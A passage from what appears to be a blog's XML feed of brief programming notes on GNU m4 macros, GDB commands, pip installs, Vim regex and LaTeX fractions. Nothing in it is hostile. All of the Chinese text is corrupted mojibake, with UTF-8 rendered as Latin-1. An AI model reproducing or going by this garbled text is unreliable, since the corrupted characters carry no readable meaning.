    </categories>
    
    
    <tags>
      
      <tag>macro c</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GNU m4 æ•™ç¨‹ Notes</title>
    <link href="/2022/08/07/GNU-m4-%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/08/07/GNU-m4-%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://segmentfault.com/a/1190000004104696">reference</a></p><h1 id="GNU-m4-ç®€ä»‹"><a href="#GNU-m4-ç®€ä»‹" class="headerlink" title="GNU m4 ç®€ä»‹"></a>GNU m4 ç®€ä»‹</h1><p>m4 æ˜¯ä¸€ç§å®å¤„ç†å™¨, å®ƒæ‰«æç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬å¹¶å°†å…¶è¾“å‡º, æœŸé—´å¦‚æœé‡åˆ°å®å°±å°†å…¶å±•å¼€åè¾“å‡º.</p><p>é™¤å±•å¼€å®, m4 å†…å»ºçš„å®èƒ½å¤ŸåŠ è½½æ–‡ä»¶, æ‰§è¡ŒShellå‘½ä»¤, åšæ•´æ•°è¿ç®—, æ“çºµæ–‡æœ¬, å½¢æˆé€’å½’ç­‰.</p><h1 id="m4-åŸºæœ¬å·¥ä½œè¿‡ç¨‹"><a href="#m4-åŸºæœ¬å·¥ä½œè¿‡ç¨‹" class="headerlink" title="m4 åŸºæœ¬å·¥ä½œè¿‡ç¨‹"></a>m4 åŸºæœ¬å·¥ä½œè¿‡ç¨‹</h1><p>åœ¨â€C Programming Languageâ€ ä¸­å°†<strong>æµ</strong>(stream), å®šä¹‰ä¸ºä¸ç£ç›˜æˆ–å…¶å®ƒå¤–å›´è®¾å¤‡å…³è”çš„æ•°æ®çš„æºæˆ–ç›®çš„åœ°. ä¹Ÿå°±å¯ä»¥ç†è§£ä¸ºæ–‡ä»¶.</p><p>ç”±æ­¤, è¾“å…¥æµå°±æ˜¯ä¸ç£ç›˜æˆ–å…¶ä»–å¤–å›´è®¾å¤‡å…³è”çš„æ•°æ®çš„æº. </p><p>è¾“å‡ºæµå°±æ˜¯ä¸ç£ç›˜æˆ–å…¶ä»–å¤–å›´è®¾å¤‡å…³è”çš„æ•°æ®çš„æºæˆ–ç›®çš„åœ°.</p><h1 id="m4-å·¥ä½œç©ºé—´"><a href="#m4-å·¥ä½œç©ºé—´" class="headerlink" title="m4 å·¥ä½œç©ºé—´"></a>m4 å·¥ä½œç©ºé—´</h1><p>éœ€è¦ä¸€ä¸ªæ¥<mark>çŠ¶æ€å¯„å­˜å™¨</mark>åˆ¤æ–­å½“å‰ä»è¾“å…¥æµä¸­è¯»å–çš„æ–‡æœ¬æ˜¯å®è¿˜æ˜¯éå®.</p><p>æœ‰ä¸€ä¸ªç¼“å­˜ç©ºé—´, ç”¨äºæé«˜æ–‡æœ¬æ•ˆç‡. å…¶å®¹é‡ä¸º512KB, å½“å®ƒæ»¡äº†çš„æ—¶å€™, m4ä¼šè‡ªåŠ¨å°†å…¶ä¸­çš„å†…å®¹å¦¥å–„ä¿å­˜åˆ°ä¸€ä»½ä¸´æ—¶æ–‡ä»¶ä¸­å¤‡ç”¨. è¿™é‡Œå®˜æ–¹çš„æ¦‚å¿µä¸ºè½¬ç§»(Diversion).</p><p>ä½¿ç”¨<code>divert</code>å®, åœ¨å„ç¼“å­˜ä¸­åˆ‡æ¢, æœ‰åç§çº§åˆ«çš„ç¼“å­˜.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br></code></pre></td></tr></table></figure><p>æœ€å, m4ä¼šå°†å„ä¸ªç¼“å­˜ä¸­çš„æ–‡æœ¬æ±‡æ€»åˆ°0å·ç¼“å­˜ä¸­.</p><p>ç¼“å­˜çš„æ±‡æ€»è¿‡ç¨‹æ˜¯æŒ‰ç…§ç¼“å­˜çº§åˆ«è¿›è¡Œçš„. æœ€åä¼šå°†0å·ç¼“å­˜ä¸­çš„å†…å®¹ä¾åºå‘é€åˆ°è¾“å‡ºæµä¸­.</p><p>æ–‡æœ¬æµç»m4çš„è¿‡ç¨‹ä¸å¯é€†.</p><p>é€†å‘å·¥ç¨‹èƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¤åŸæŸä¸ªç¨‹åºçš„ä»£ç , ä½†å®ƒå´æ°¸è¿œæ— æ³•åŸºäºå®çš„å±•å¼€é‡ç°å®çš„å®šä¹‰.</p><h1 id="æš—é»‘ç¼“å­˜"><a href="#æš—é»‘ç¼“å­˜" class="headerlink" title="æš—é»‘ç¼“å­˜"></a>æš—é»‘ç¼“å­˜</h1><p>ç¼–å·ä¸ºè´Ÿæ•°, ä¸é™æ•°é‡.</p><p>m4 ä¸ä¼šå°†æš—é»‘ç¼“å­˜æ±‡æ€»çš„å†…å®¹å‘é€åˆ°è¾“å‡ºæµ.</p><p>æš—é»‘ç¼“å­˜çš„ä¸»è¦ä½œç”¨æ˜¯ä½œä¸ºå®å®šä¹‰çš„ç©ºé—´.</p><p>é•¿åº¦ä¸ºé›¶çš„å­—ç¬¦ä¸²è¢«å‘é€åˆ°è¾“å‡ºæµ, ä¸ä¼šå¯¹å…¶äº§ç”Ÿå½±å“.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(say_hello_world, Hello World!)</span></span><br>say_hello_world<br></code></pre></td></tr></table></figure><p><code>divert(0)</code> åŠå…¶ä»–è¯­å¥åé¢æœ‰ä¸€ä¸ªæ¢è¡Œç¬¦, ä¼šå¯¹è¾“å‡ºäº§ç”Ÿå½±å“.</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">$ <span class="hljs-name">m4</span> hello.<span class="hljs-name">m4</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æš—é»‘ç¼“å­˜ä»¥é¿å…ä¸€ä¸ªæ¢è¡Œç¬¦çš„å½±å“:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(-<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(say_hello_world, Hello World!)</span></span><br><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br>say_hello_world<br></code></pre></td></tr></table></figure><p>è°ƒç”¨æ—¶é¿å…æ¢è¡Œç¬¦çš„å½±å“:</p><ul><li>divert(0)åä¸æ¢è¡Œ</li><li>ä½¿ç”¨m4å†…å»ºçš„dnlå®<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(-<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(say_hello_world, Hello World!)</span></span><br><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">dnl</span></span><br>say_hello_world<br></code></pre></td></tr></table></figure></li></ul><h1 id="å®"><a href="#å®" class="headerlink" title="å®"></a>å®</h1><p><code>define</code>å…³é”®å­—ç”¨äºå®šä¹‰å®:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(hello, HELLO)</span></span><br></code></pre></td></tr></table></figure><p>å‰ä¸€ä¸ªæ˜¯å®, åä¸€ä¸ªæ˜¯å±•å¼€çš„å€¼.</p><p><code>define</code>æœ¬èº«å°±æ˜¯ä¸€ä¸ªå®, ä¹Ÿä¼šè¢«m4å±•å¼€, åªä¸è¿‡å®ƒçš„å±•å¼€ç»“æœæ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸².</p><h1 id="æœ‰å‚æ•°çš„å®"><a href="#æœ‰å‚æ•°çš„å®" class="headerlink" title="æœ‰å‚æ•°çš„å®"></a>æœ‰å‚æ•°çš„å®</h1><p>å®å¯ä»¥æœ‰å‚æ•°.</p><p>éµå¾ªPOSIXæ ‡å‡†çš„m4, å…è®¸ä¸€ä¸ªå®æœ€å¤šæœ‰9ä¸ªå‚æ•°. åœ¨å®ä½“ä¸­å¯ä½¿ç”¨<code>$1</code>,â€¦,<code>$9</code>æ¥å¼•ç”¨. GNUçš„m4ä¸é™åˆ¶å®çš„å‚æ•°æ•°é‡.</p><p><mark>æ³¨æ„</mark>, cå®ä¸m4å®çš„è°ƒç”¨æœ‰ç‚¹åŒºåˆ«. åœ¨Cä¸­, è°ƒç”¨ä¸€ä¸ªå®, å®åä¸å…¶åçš„â€(â€œå¯ä»¥æœ‰ç©ºæ ¼, è€Œm4å®çš„è°ƒç”¨ä¸å…è®¸è¿™æ ·.</p><p>m4çš„å®ä½“æ˜¯ä¸€ä¸ªå¸¦å¼•å·çš„å­—ç¬¦ä¸², åšå¼•å·ä¸<code>~</code>åŒé”®, æœ‰å¼•å·ä¸<code>&quot;</code>åŒé”®.</p><p><code>,</code>ä¼šè¢«m4æ•è·ä¸ºå®å‚æ•°åˆ†éš”ç¬¦, è€Œå¼•å·å¯ä½¿ä¹‹é€ƒé€¸.</p><h1 id="å®çš„é™·é˜±"><a href="#å®çš„é™·é˜±" class="headerlink" title="å®çš„é™·é˜±"></a>å®çš„é™·é˜±</h1><p>m4å…è®¸å®çš„é‡å®šä¹‰, ç»“æœæ˜¯æ–°çš„å®å®šä¹‰ä¼šè¦†ç›–æ—§çš„.</p><p>m4çš„å®å‘½åè§„åˆ™: åªå…è®¸ä½¿ç”¨å­—æ¯, æ•°å­—ä»¥åŠä¸‹åˆ’çº¿æ„é€ å®å, å¹¶ä¸”å®ååªèƒ½ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´.</p><p>å¯¹å®è¿›è¡Œé‡å®šä¹‰æ—¶, éœ€è¦å€ŸåŠ©å¼•å·.</p><p>å¼•å·çš„ä½œç”¨:</p><ul><li>m4 å°†ä¸€åˆ‡æ²¡æœ‰å¼•å·çš„æ–‡æœ¬éƒ½è§†ä¸ºå®ã€‚å¯¹äºå·²å®šä¹‰çš„å®ï¼Œm4 ä¼šå°†å…¶å±•å¼€ï¼›å¯¹äºæœªå®šä¹‰çš„å®ï¼Œm4 ä¼šæŒ‰å…¶å­—é¢å°†å…¶è¾“å‡ºã€‚</li><li>åŠ äº†å¼•å·çš„æ–‡æœ¬ï¼Œm4 ä¸å†æ£€æµ‹å®ƒä»¬æ˜¯ä¸æ˜¯å®ï¼Œè€Œæ˜¯å°†å…¶ä½œä¸ºæ™®é€šæ–‡æœ¬æŒ‰å­—é¢è¾“å‡ºã€‚</li></ul><p>ä¹Ÿå°±æ˜¯, åŠ äº†å¼•å·çš„æ–‡æœ¬, ä¼šè¢«m4è®¤ä¸ºæ™®é€šå­—ç¬¦è¾“å‡º.</p><h1 id="è®°å·"><a href="#è®°å·" class="headerlink" title="è®°å·"></a>è®°å·</h1><p>m4è¾“å…¥æµåŸç†:<br>m4 å¯¹è¾“å…¥æµæ˜¯ä»¥è®°å·ï¼ˆTokenï¼‰ä¸ºå•å…ƒè¿›è¡Œè¯»å–çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œm4 ä¼šå°†è¯»å–çš„æ¯ä¸ªè®°å·ç›´æ¥å‘é€åˆ°è¾“å‡ºæµï¼Œä½†æ˜¯å½“ m4 å‘ç°æŸä¸ªå•è¯æ˜¯å·²å®šä¹‰çš„å®åæ—¶ï¼Œå®ƒä¼šå°†è¿™ä¸ªå®å±•å¼€ã€‚åœ¨å¯¹å®è¿›è¡Œå±•å¼€çš„è¿‡ç¨‹ä¸­ï¼Œm4 å¯èƒ½ä¼šéœ€è¦è¯»å…¥æ›´å¤šçš„æ–‡æœ¬ä»¥è·å–å®çš„å‚æ•°ã€‚å®å±•å¼€çš„ç»“æœä¼šè¢«æ’å…¥åˆ°è¾“å…¥æµå‰©ä½™éƒ¨åˆ†çš„å‰ç«¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®å±•å¼€åæ‰€å¾—åˆ°çš„æ–‡æœ¬ä¼šè¢« m4 é‡æ–°è¯»å–ï¼Œè§£æä¸ºè®°å·ï¼Œç»§ç»­å¤„ç†ã€‚</p><p>åœ¨å®å‚æ•°åˆ—è¡¨ä¸­, åœ¨<code>,</code>ä¹‹åçš„ç©ºæ ¼æ˜¯æ— æ„ä¹‰çš„å­—ç¬¦.</p><p>ç©ºçš„å­—ç¬¦ä¸², è™½ç„¶ä¸å…·å¤‡è¢« m4 å‘é€åˆ°è¾“å‡ºæµçš„èµ„æ ¼, ä½†æ˜¯å®ƒå¯ä»¥ä½œä¸ºå…¶ä»–è®°å·çš„è¾¹ç•Œè®°å·ä½¿ç”¨.</p><h1 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h1><p><code>#</code> æ˜¯è¡Œæ³¨é‡Šç¬¦, m4 çš„æ³¨é‡Šæ–‡æœ¬ä¹Ÿä¼šè¢«å‘é€åˆ°è¾“å‡ºæµ.</p><p>å¯ä½¿ç”¨<code>changecom</code>å®ä¿®æ”¹ m4 é»˜è®¤çš„æ³¨é‡Šç¬¦:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">changecom</span>(`@@&#x27;)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å—æ³¨é‡Šç¬¦:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">changecom</span><span class="hljs-params">(/*,*/)</span></span><br></code></pre></td></tr></table></figure><p>ä¸å›æ˜¾æ³¨é‡Šæ–‡æœ¬, ä½¿ç”¨<code>dnl</code>:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">define(<span class="hljs-symbol">`VERSION&#x27;</span>,<span class="hljs-symbol">`A1&#x27;</span>)<br><span class="hljs-keyword">VERSION</span> dnl <span class="hljs-keyword">VERSION</span> <span class="hljs-symbol">`quote&#x27;</span> unmatched`<br></code></pre></td></tr></table></figure><h1 id="å¼•å·-é€ƒé€¸ä»¥åŠéASCIIå­—ç¬¦"><a href="#å¼•å·-é€ƒé€¸ä»¥åŠéASCIIå­—ç¬¦" class="headerlink" title="å¼•å·, é€ƒé€¸ä»¥åŠéASCIIå­—ç¬¦"></a>å¼•å·, é€ƒé€¸ä»¥åŠéASCIIå­—ç¬¦</h1><p>ä½¿ç”¨<code>changequote</code>å®ä¿®æ”¹m4é»˜è®¤çš„å¼•å·å®šç•Œç¬¦:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">changequote</span><span class="hljs-params">(&lt;!,!&gt;)</span></span><br></code></pre></td></tr></table></figure><p>ä¸å‘å…¶æä¾›å‚æ•°, å³æ¢å¤é»˜è®¤å¼•å·å®šç•Œç¬¦.</p><h1 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h1><p><code>ifdef</code>å®ç”¨äºåˆ¤æ–­å®æ˜¯å¦å®šä¹‰, <code>ifelse</code>å®åˆ¤æ–­è¡¨è¾¾å¼çš„çœŸå‡.</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ifdef</span>(`a&#x27;, b)<br></code></pre></td></tr></table></figure><p>å¦‚æœ<code>a</code>æ˜¯å·²å®šä¹‰å®, é‚£ä¹ˆè¿™æ¡è¯­å¥çš„å±•å¼€ç»“æœæ˜¯<code>b</code>.<br><code>ifelse(a,b,c,d)</code>ä¼šæ¯”è¾ƒå­—ç¬¦ä¸²<code>a</code>ä¸<code>b</code>æ˜¯å¦ç›¸åŒ, å¦‚æœå®ƒä»¬ç›¸åŒ, è¿™æ¡è¯­å¥çš„å±•å¼€ç»“æœæ˜¯å­—ç¬¦ä¸²<code>c</code>, å¦åˆ™åˆ™å±•å¼€ä¸ºå­—ç¬¦ä¸²<code>d</code>.</p><p><code>ifelse</code>å¯ä»¥æ”¯æŒå¤šä¸ªåˆ†æ”¯.</p><h1 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h1><p>m4å†…å»ºå®<code>eval</code>, å¯¹æ•´å‹æ•°çš„è¿ç®—è¡¨è¾¾å¼è¿›è¡Œæ±‚å€¼.</p><p>åœ¨<code>m4</code>ä¸­å¯ä»¥é€šè¿‡<code>esyscmd</code>å®è®¿é—®Shell.</p><h1 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h1><p>m4ä¼šå°†å½“å‰å®çš„å±•å¼€ç»“æœæ’å…¥åˆ°å¾…è¯»å–çš„è¾“å…¥æµçš„å‰ç«¯.</p>]]></content>
    
    
    <categories>
      
      <category>GNU m4</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Debugging with GDB v8.3.1 Notes</title>
    <link href="/2022/08/07/Debugging-with-GDB-v8-3-1-Notes/"/>
    <url>/2022/08/07/Debugging-with-GDB-v8-3-1-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="1-A-Simple-GDB-Session"><a href="#1-A-Simple-GDB-Session" class="headerlink" title="1 A Simple GDB Session"></a>1 A Simple GDB Session</h1><p>åŒºåˆ†<code>next</code>å’Œ<code>step</code>:</p><ul><li><code>next</code> ç”¨åœ¨æ‰§è¡Œæ•´ä¸ªç¨‹åº</li><li><code>step</code> ç”¨åœ¨è¿›å…¥åˆ°ä¸€ä¸ªå‡½æ•°çš„å†…éƒ¨ç¨‹åº</li></ul><p><code>continue</code>åº”è¯¥æ˜¯ä½¿æš‚åœçš„ç¨‹åºç»§ç»­è¿è¡Œ.</p><h1 id="2-Getting-In-and-Out-of-GDB"><a href="#2-Getting-In-and-Out-of-GDB" class="headerlink" title="2 Getting In and Out of GDB"></a>2 Getting In and Out of GDB</h1><p>The command-line options described here are designed to cover a variety of situations.</p><p>You can start with both an executeble program and a core file specified:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">gdb <span class="hljs-keyword">program</span> core<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ª argument å¯ä»¥æ”¹ä¸º process ID, ä»¥æ­¤ debug a running process:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> program <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h3 id="2-1-1-Choosing-Files"><a href="#2-1-1-Choosing-Files" class="headerlink" title="2.1.1 Choosing Files"></a>2.1.1 Choosing Files</h3><p>If you prefer, you can flag option arguments with â€˜â€“â€™ rather than â€˜-â€˜.</p><h3 id="2-1-2-Choosing-Modes"><a href="#2-1-2-Choosing-Modes" class="headerlink" title="2.1.2 Choosing Modes"></a>2.1.2 Choosing Modes</h3><h3 id="2-1-3-What-GDB-Does-During-Startup"><a href="#2-1-3-What-GDB-Does-During-Startup" class="headerlink" title="2.1.3 What GDB Does During Startup"></a>2.1.3 What GDB Does During Startup</h3><p>The GDB init file are normally called <code>.gdbinit</code>.</p><h2 id="2-2-Quitting-GDB"><a href="#2-2-Quitting-GDB" class="headerlink" title="2.2 Quitting GDB"></a>2.2 Quitting GDB</h2><h2 id="2-3-Shell-Commands"><a href="#2-3-Shell-Commands" class="headerlink" title="2.3 Shell Commands"></a>2.3 Shell Commands</h2><p>Using shell command during debugging:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">!<span class="hljs-keyword">command</span>-<span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p>å¯ç›´æ¥ä½¿ç”¨<code>make</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">make</span> <span class="hljs-keyword">make</span>-<span class="hljs-keyword">args</span><br></code></pre></td></tr></table></figure><h2 id="2-4-Logging-Output"><a href="#2-4-Logging-Output" class="headerlink" title="2.4 Logging Output"></a>2.4 Logging Output</h2><p>ä¿å­˜ the output of GDB commands to a file.</p><h1 id="3-GDB-Commands"><a href="#3-GDB-Commands" class="headerlink" title="3 GDB Commands"></a>3 GDB Commands</h1><h2 id="3-1-Command-Syntax"><a href="#3-1-Command-Syntax" class="headerlink" title="3.1 Command Syntax"></a>3.1 Command Syntax</h2><p>A blank line as input to GDB means to repeat the previous command. User-defined commands can disable this feature.</p><h2 id="3-2-Command-Completion"><a href="#3-2-Command-Completion" class="headerlink" title="3.2 Command Completion"></a>3.2 Command Completion</h2><p>æŒ‰<code>M-?</code>å’ŒæŒ‰ä¸¤æ¬¡<code>TAB</code>ä½œç”¨ç›¸åŒ.</p><h2 id="3-3-Getting-Help"><a href="#3-3-Getting-Help" class="headerlink" title="3.3 Getting Help"></a>3.3 Getting Help</h2><p>Using <code>help</code>.</p><p><code>help class</code>, è¾“å…¥<code>help</code>åå‡ºç°çš„æ˜¯<code>class</code>, <code>help class</code> ä¼šæ˜¾ç¤ºè¿™ä¸ªclassä¸­çš„å‘½ä»¤.</p><p><code>apropos args</code>, the <code>apropos</code> command searches through all of the GDB commands, and their documentation, for the <mark>regular expression</mark> specified in <code>args</code>.</p><p><code>complete args</code>, the <code>complete args</code> command lists all the possible completions for the beginning of a command.</p><p>é™¤äº†<code>help</code>, <code>info</code> å’Œ <code>show</code> éƒ½èƒ½å¤Ÿç»™å‡º the state of your program, or the state of GDB itself.</p><ul><li>list, ç”¨äº describing the state of your program, å¦‚<code>info args</code>, <code>info registers</code>, <code>info breakpoints</code>.</li><li>set, ç”¨äº assign an environment variable.</li><li>show, ç”¨äº describing the state of GDB itself. To display all the settable parameters and their current values, you can use <code>show</code> with no argument or <code>info set</code>.</li></ul><h1 id="4-Running-Programs-Under-GDB"><a href="#4-Running-Programs-Under-GDB" class="headerlink" title="4 Running Programs Under GDB"></a>4 Running Programs Under GDB</h1><h2 id="4-1-Compiling-for-Debugging"><a href="#4-1-Compiling-for-Debugging" class="headerlink" title="4.1 Compiling for Debugging"></a>4.1 Compiling for Debugging</h2><p>åœ¨ç¼–è¯‘æ—¶ä½¿ç”¨<code>-g</code>é€‰é¡¹.</p><p>Some compilers are unable to handle the <code>-g</code> and <code>-O</code> options together.</p><p>Always use <code>-g</code> whenever you compile a program is recommended.</p><p><code>DWARF</code> is currently the most expressive and best supported debugging format in GDB.</p><h2 id="4-2-Starting-your-Program"><a href="#4-2-Starting-your-Program" class="headerlink" title="4.2 Starting your Program"></a>4.2 Starting your Program</h2><ul><li>start, this command does the equivalent of setting a temporary breakpoint at the beginning of the main procedure and then invoking the <code>run</code> command.</li></ul><h2 id="4-3-Your-Programâ€™s-Arguments"><a href="#4-3-Your-Programâ€™s-Arguments" class="headerlink" title="4.3 Your Programâ€™s Arguments"></a>4.3 Your Programâ€™s Arguments</h2><p>The arguments to your program can be specified by the arguments of the <code>run</code> command.</p>]]></content>
    
    
    <categories>
      
      <category>GDB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰è£…PythonåŒ…</title>
    <link href="/2022/08/06/%E5%AE%89%E8%A3%85Python%E5%8C%85/"/>
    <url>/2022/08/06/%E5%AE%89%E8%A3%85Python%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="ä½¿ç”¨-pip"><a href="#ä½¿ç”¨-pip" class="headerlink" title="ä½¿ç”¨ pip"></a>ä½¿ç”¨ pip</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> matplotlib<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-python"><a href="#ä½¿ç”¨-python" class="headerlink" title="ä½¿ç”¨ python"></a>ä½¿ç”¨ python</h1><p>ä¸‹è½½æºä»£ç å:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim ä¸­çš„æ­£åˆ™ Notes</title>
    <link href="/2022/08/06/Vim-%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99-Notes/"/>
    <url>/2022/08/06/Vim-%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="éæ•è·å‹æ‹¬å·"><a href="#éæ•è·å‹æ‹¬å·" class="headerlink" title="éæ•è·å‹æ‹¬å·"></a>éæ•è·å‹æ‹¬å·</h1><p>åœ¨æ‹¬å·å‰åŠ <code>%</code>:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><h1 id="åŒºåˆ†å¤§å°å†™"><a href="#åŒºåˆ†å¤§å°å†™" class="headerlink" title="åŒºåˆ†å¤§å°å†™"></a>åŒºåˆ†å¤§å°å†™</h1><p>ä½¿ç”¨<code>\c</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Writing fraction in LaTeX</title>
    <link href="/2022/08/05/Writing-fraction-in-LaTeX/"/>
    <url>/2022/08/05/Writing-fraction-in-LaTeX/</url>
    
    <content type="html"><![CDATA[<p>use:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\frac</span><span class="hljs-template-variable">&#123;&#125;</span><span class="hljs-template-variable">&#123;&#125;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª<code>&#123;&#125;</code>ä¸ºåˆ†å­, åä¸€ä¸ªä¸ºåˆ†æ¯.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®€å•é«˜æ•ˆLaTeX Notes</title>
    <link href="/2022/08/04/%E7%AE%80%E5%8D%95%E9%AB%98%E6%95%88LaTeX-Notes/"/>
    <url>/2022/08/04/%E7%AE%80%E5%8D%95%E9%AB%98%E6%95%88LaTeX-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬1ç« -å†™ç»™è¯»è€…"><a href="#ç¬¬1ç« -å†™ç»™è¯»è€…" class="headerlink" title="ç¬¬1ç«  å†™ç»™è¯»è€…"></a>ç¬¬1ç«  å†™ç»™è¯»è€…</h1><p>Macro æ˜¯ä¸€ä¸ªè®¡ç®—æœºæ¦‚å¿µ, æŒ‡ç”¨å•ä¸ªå‘½ä»¤æˆ–æ“ä½œå®Œæˆä¸€ç³»åˆ—åº•å±‚å‘½ä»¤æˆ–æ“ä½œçš„ç»„åˆ.</p><p>LaTeX åœ¨ TeX çš„åŸºç¡€ä¸Šå®šä¹‰äº†ä¼—å¤šçš„å®å‘½ä»¤.</p><p>TeX ç³»ç»Ÿå…è®¸ä½ ä»¥æ•°å­—å‚æ•°çš„æ–¹å¼æŠŠæ’ç‰ˆå†…å®¹å†™åˆ°ä»»æ„çš„ä½ç½®.</p><p>LaTeX ç”Ÿæˆçš„æ–‡ä»¶æ ¼å¼ä¸€èˆ¬æ˜¯ pdf å’Œdvi æ ¼å¼. LaTeX æ— æ³•ç”Ÿæˆ doc æˆ–è€… docx æ ¼å¼çš„æ–‡ä»¶, å› ä¸ºé‚£æ˜¯å¾®è½¯çš„å•†ç”¨æ ¼å¼, ä¸¤è€…çš„å·¥ä½œæœºç†ä¹Ÿå®Œå…¨ä¸åŒ.</p><h1 id="ç¬¬2ç« -LaTeX-ç¯å¢ƒé…ç½®"><a href="#ç¬¬2ç« -LaTeX-ç¯å¢ƒé…ç½®" class="headerlink" title="ç¬¬2ç«  LaTeX ç¯å¢ƒé…ç½®"></a>ç¬¬2ç«  LaTeX ç¯å¢ƒé…ç½®</h1><p><a href="https://tug.org/texlive/">ä¸‹è½½ TeX Live</a><br><a href="https://www.texstudio.org/">å®‰è£…TeX Studio</a></p><h2 id="2-3-TeX-Live-æœ¬åœ°å®åŒ…ç®¡ç†"><a 